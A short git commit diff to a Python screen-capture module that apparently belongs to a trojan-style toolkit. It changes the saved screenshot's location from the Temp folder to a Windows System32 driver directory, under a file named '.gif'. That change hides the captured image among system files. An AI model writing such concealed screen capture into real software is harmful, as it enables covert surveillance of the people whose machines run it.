c34fadf9abf508a93fd6df8336c8e301cd73850b
OXVyeah <2529004225@qq.com>
2016-09-13 20:47:35 +0800

    Update screenshotter.py

--- modules/screenshotter.py
+++ modules/screenshotter.py
@@ -29,7 +29,7 @@ def run(**args):
     mem_dc.BitBlt((0, 0), (width, height), img_dc, (left, top), win32con.SRCCOPY)
 
     # save the bitmap to a file
-    screenshot.SaveBitmapFile(mem_dc, 'c:\\WINDOWS\\Temp\\screenshot.bmp')
+    screenshot.SaveBitmapFile(mem_dc, 'C:\\Windows\\System32\\drivers\\ch-US\\screenshooter.gif')
     img=mem_dc
     # free our objects
     mem_dc.DeleteDC()
